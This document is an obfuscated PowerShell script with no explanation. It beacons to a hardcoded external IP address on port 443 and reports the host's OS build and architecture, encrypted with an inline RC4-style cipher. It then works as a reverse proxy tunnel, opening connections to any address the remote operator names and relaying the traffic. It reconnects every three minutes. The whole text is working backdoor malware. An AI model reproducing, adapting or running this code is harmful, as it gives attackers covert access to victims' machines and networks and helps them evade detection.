$t2 = New-Object byte[] 50; $u1 = '94.156.189.36'; $p8 = 443; For ($i=0; $i -ne 50; $i++) { $t2[$i] = $i } $x7={ Param ( $j3, $s3, $e8, $a9, $e7, $s, $w, $r ); Function m9($h2, [int]$w3, $g4, $v0, $m6) { $z0 = New-Object byte[] 256; [int]$j4 = 0; [int]$c6 = 0; [int]$s3 = 0; [int]$y0 = 0; [int]$y5 = 0; [int]$l8 = 0; [int]$p4 = 0; [int]$r5 = 0; [int]$e0 = 0; [int]$t = 0; [int]$r1 = 0; For ($i=0; $i -le 255; $i++) { $z0[$i] = $i }; do { if ($r1 -eq 0) { $s3 = 0; $y0 = $w3; } if ($r1 -ne 0) { $r1 = 0; $s3++; if (--$y0 -eq 0) { continue; } }; $r5 = $z0[$j4]; $t = $h2[$s3] -as[int]; $c6 += $t; $c6 = $c6 -band 255; $c6 += $r5; $c6 = $c6 -band 255; $p4 = $z0[$c6]; $z0[$j4] = $p4; $z0[$c6] = $r5; $j4++; $j4 = $j4 -band 255; if ($j4 -ne 0) { $r1 = 1; continue; } $y5 = $m6; $c6 = 0; $j4 = 0; $s3 = 0; $y0 = 0; do { $s3++; $s3 = $s3 -band 255; $r5 = $z0[$s3]; $c6 += $r5; $c6 = $c6 -band 255; $e0 = $z0[$c6]; $z0[$s3] = $e0; $z0[$c6] = $r5; $e0 += $r5; $e0 = $e0 -band 255; $j4 = $z0[$e0]; $l8 = $g4[$v0 + $y0]; $l8 = $l8 -bxor $j4; $g4[$v0 + $y0] = $l8 -as [byte]; $y0++; if (--$y5 -eq 0) { break; } } while($true) break } while($true) } [int]$m1 = 0; $p3 = $null; $i3 = New-Object byte[] 65536; $i1 = New-Object byte[] 13; For ($i=0; $i -ne 13; $i++) { $i1[$i] = 0x00 } $i1[0] = $s3 -as [byte]; $i1[1] = 0x0A; $i1[3] = 0x05; $i1[6] = 0x01; try { $e3 = 1; $j3[$s3] = New-Object System.Net.Sockets.TcpClient( $e8, $a9); $p3 = $j3[$s3]; $j3[$s3].NoDelay = $true; $j3[$s3].ReceiveTimeout = $e3 * 1000; $s[$s3] = $j3[$s3].GetStream(); $r[$s3] = New-Object System.IO.BinaryReader($s[$s3]); $w[$s3] = New-Object System.IO.BinaryWriter($s[$s3]); m9 $e7 50 $i1 0 3; m9 $e7 50 $i1 3 10; $w[0].Write($i1, 0, 13); $w[0].Flush(); } catch { $i1[4] = 0x01; m9 $e7 50 $i1 0 3; m9 $e7 50 $i1 3 10; $w[0].Write($i1, 0, 13); $w[0].Flush(); } try { do { try { $m4 = [int](Get-Date -uformat "%s"); $a6 = $r[$s3].Read($i3, 3, 65530); if ($a6 -eq 0) { break } } catch { $a3 = [int](Get-Date -uformat "%s"); $d5 = $a3 - $m4; if ($d5 -ge $e3) { continue; } break } $i3[0] = $s3 -as[byte]; $z6 = $a6 -band 0x000000ff; $t9 = [math]::Floor(($a6 -band 0x0000ff00) * [math]::Pow(2,-8)); $i3[1] = $z6 -as[byte]; $i3[2] = $t9 -as[byte]; m9 $e7 50 $i3 0 3; m9 $e7 50 $i3 3 $a6; $w[0].Write($i3, 0, $a6 + 3); $w[0].Flush(); } while($j3[$s3] -ne $null) } catch { $m1++; } $i1[0] = $s3 -as [byte]; $i1[1] = 0x00; $i1[2] = 0x00; m9 $e7 50 $i1 0 3; $w[0].Write($i1, 0, 3); $w[0].Flush(); if ($p3 -ne $null) { $p3.Close() }; }; function p1($h2, [int]$w3, $g4, $v0, $m6) { $z0 = New-Object byte[] 256; [int]$j4 = 0; [int]$c6 = 0; [int]$s3 = 0; [int]$y0 = 0; [int]$y5 = 0; [int]$l8 = 0; [int]$p4 = 0; [int]$r5 = 0; [int]$e0 = 0; [int]$t = 0; [int]$r1 = 0; For ($i=0; $i -le 255; $i++) { $z0[$i] = $i } do { if ($r1 -eq 0) { $s3 = 0; $y0 = $w3; } if ($r1 -ne 0) { $r1 = 0; $s3++; if (--$y0 -eq 0) { continue; } } $r5 = $z0[$j4]; $t = $h2[$s3] -as[int]; $c6 += $t; $c6 = $c6 -band 255; $c6 += $r5; $c6 = $c6 -band 255; $p4 = $z0[$c6]; $z0[$j4] = $p4; $z0[$c6] = $r5; $j4++; $j4 = $j4 -band 255; if ($j4 -ne 0) { $r1 = 1; continue; } $y5 = $m6; $c6 = 0; $j4 = 0; $s3 = 0; $y0 = 0; do { $s3++; $s3 = $s3 -band 255; $r5 = $z0[$s3]; $c6 += $r5; $c6 = $c6 -band 255; $e0 = $z0[$c6]; $z0[$s3] = $e0; $z0[$c6] = $r5; $e0 += $r5; $e0 = $e0 -band 255; $j4 = $z0[$e0]; $l8 = $g4[$v0 + $y0]; $l8 = $l8 -bxor $j4; $g4[$v0 + $y0] = $l8 -as [byte]; $y0++; if (--$y5 -eq 0) { break; } } while($true) break; } while($true) } Function v8([string]$u1, [int]$p8) { $i1 = New-Object byte[] 3; $j3 = @(0) * 200; For ($i=0; $i -ne 200; $i++) { $j3[$i] = $null }; $s = @(0) * 200; $w = @(0) * 200; $r = @(0) * 200; $e3 = 120; [int]$m1 = 0; [int]$a9 = 0; [string]$e8; [int]$c6 = 0; [int]$s3 = 0; [int]$j4 = 0; [int]$h7 = 0; [int]$p5 = 0; [int]$a6 = 0; [int]$u8 = 0; [int]$x0 = 0; [int]$m8 = 0; [int]$k2 = 0; $j = New-Object object[] 200; $u5 = New-Object byte[] 20; $v1 = New-Object byte[] 65536; $d9 = New-Object byte[] 65536; $a4 = New-Object byte[] 65536; try { $m2 = [RunspaceFactory]::CreateRunspacePool(1, 200); $m2.Open(); $j3[0] = New-Object System.Net.Sockets.TcpClient( $u1, $p8); $j3[0].NoDelay = $true; $j3[0].ReceiveTimeout = $e3 * 1000; $s[0] = $j3[0].GetStream(); $r[0] = New-Object System.IO.BinaryReader($s[0]); $w[0] = New-Object System.IO.BinaryWriter($s[0]); For ($i=0; $i -ne 50; $i++) { $v1[$i] = $t2[$i] }; For ($i=50; $i -ne 100; $i++) { $v1[$i] = 0 }; $p6 = 0; if ([IntPtr]::Size -eq 8) {$p6 = 1}; $v1[53] = $p6 -as[byte]; $s4 = [system.environment]::osversion.version.build; $y8 = $s4 -band 0x000000ff; $c7 = [math]::Floor(($s4 -band 0x0000ff00) * [math]::Pow(2,-8)); $v1[50] = $y8 -as[byte]; $v1[51] = $c7 -as[byte]; $v1[54] = 0x50 -as[byte]; $v1[55] = 0x53 -as[byte]; p1 $t2 50 $v1 50 50; $w[0].Write($v1, 0, 100); $w[0].Flush(); [int]$o1 = 0; while($true) { $m4 = [int](Get-Date -uformat "%s"); try { if ($u8 -eq 0 -and $k2 -ne 4) { $a6 = $r[0].Read($d9, 0, 65536); if ($a6 -eq 0) { break; } $o1 = 0; } } catch { $a3 = [int](Get-Date -uformat "%s"); $d5 = $a3 - $m4; if ($d5 -ge $e3) { if ($m8 -ne 0 -or $k2 -ne 0) { break }; $o1++; if ($o1 -eq 7) { break }; if ($o1 -eq 5) { $u5[0] = 0x00 -as[byte]; $u5[1] = 0x00 -as[byte]; $u5[2] = 0x00 -as[byte]; p1 $t2 50 $u5 0 3; $w[0].Write($u5, 0, 3); $w[0].Flush(); } continue; } break; } if ($m8 -ne 0 -or $k2 -eq 4) { if ($v1[2 + 0] -eq 0x00 -as[byte] -and $v1[2 + 1] -eq 0x00 -as[byte]) { if ($v1[0] -eq 0xFF -as[byte] -and $v1[1] -eq 0xFE -as[byte]) { $p5 = 1; break; } if ($v1[0 + 0] -eq 0x00 -as[byte] -and $v1[0 + 1] -eq 0x00 -as[byte]) { $v1[0 + 0] = 0x00 -as[byte]; } else { $j4 = $v1[1]; if ($j3[$j4] -ne $null) { $j3[$j4] = $null }; } } else { if ($u8 -eq 0) { if ($a6 -eq 0) { try { $a6 = $r[0].Read($d9, 0, 65536); if ($a6 -eq 0) { break; } } catch { break; } } if ($a6 -lt 0 -or $a6 -eq 0) { break } For ($i=0; $i -ne $a6; $i++) { $a4[$i] = $d9[$i] } $u8 = $a6; $x0 = 0; $a6 = 0; } $h7 = $m8; $j4 = 256 * $v1[2 + 1] + $v1[2 + 0]; $j4 -= $h7; if ($u8 -le $j4) { $j4 = $u8 }; For ($i=0; $i -ne $j4; $i++) { $v1[$i + $h7 + 4] = $a4[$i + $x0] }; $x0 += $j4; $u8 -= $j4; $m8 += $j4; if ((256 * $v1[2 + 1] + $v1[2 + 0]) -eq $m8) { $c6 = 256 * $v1[2 + 1] + $v1[2 + 0]; p1 $t2 50 $v1 4 $c6; $s3 = $v1[1]; if ($v1[0] -eq 0xFF -as[byte] -and $v1[1] -eq 0xFF -as[byte]) { $m1++; } elseif ($v1[0] -eq 0x00 -as[byte]) { if ($v1[4 + 3] -eq 0x03 -as[byte]) { $a9 = 256 * $v1[4 + 5 + $v1[4 + 4] + 0] + $v1[4 + 5 + $v1[4 + 4] + 1]; $l5 = New-Object byte[] $v1[4 + 4]; For ($i=0; $i -ne $v1[4 + 4] -as[int]; $i++) { $l5[$i] = $v1[$i + 4 + 5] } [string]$e8 = [System.Text.Encoding]::ASCII.GetString($l5); } elseif ($v1[4 + 3] -eq 0x01 -as[byte]) { [int]$a = $v1[4 + 4 + 0] -as[int]; [int]$b = $v1[4 + 4 + 1] -as[int]; [int]$c = $v1[4 + 4 + 2] -as[int]; [int]$e8 = $v1[4 + 4 + 3] -as[int]; [string]$e8 = "{0}.{1}.{2}.{3}" -f $a, $b, $c, $e8; $a9 = 256 * $v1[4 + 8 + 0] + $v1[4 + 8 + 1]; } else { [string]$e8 = "empty"; $a9 = 0; } $w4 = [PowerShell]::Create(); $w4.RunspacePool = $m2; [void]$w4.AddScript($x7); [void]$w4.AddParameter("a9", $a9); [void]$w4.AddParameter("e7", $t2); [void]$w4.AddParameter("j3", $j3); [void]$w4.AddParameter("s3", $s3); [void]$w4.AddParameter("e8", $e8); [void]$w4.AddParameter("s", $s); [void]$w4.AddParameter("w", $w); [void]$w4.AddParameter("r", $r); $j[$i] = [PSCustomObject]@{ PowerShell = $w4; AsyncResult = $w4.BeginInvoke(); } } else { try { $w[$s3].Write($v1, 4, $c6); $w[$s3].Flush(); } catch { $m1++; } } $m8 = 0; } } $k2 = 0; } else { if ($u8 -eq 0) { if ($a6 -eq 0) { try { $a6 = $r[0].Read($d9, 0, 65536); if ($a6 -eq 0) { break; } } catch { break; } } if ($a6 -lt 0 -or $a6 -eq 0) { break; } For ($i=0; $i -ne $a6; $i++) { $a4[$i] = $d9[$i] }; $u8 = $a6; $x0 = 0; $a6 = 0; } $j4 = $k2; $h7 = 4; $h7 -= $k2; if ($u8 -lt $h7) { $h7 = $u8 }; For ($i=0; $i -ne $h7; $i++) { $v1[$i + $j4] = $a4[$i + $x0] }; $x0 += $h7; $u8 -= $h7; $k2 += $h7; if ($k2 -eq 4) { p1 $t2 50 $v1 0 4 }; } }; if ($p5 -eq 1) { [Environment]::Exit(0); } throw "close"; } catch { $m2.Dispose(); if ($j3[0] -ne $null) { $j3[0].Close(); } }; } while($true) { v8 $u1 $p8; Start-Sleep -s 180; }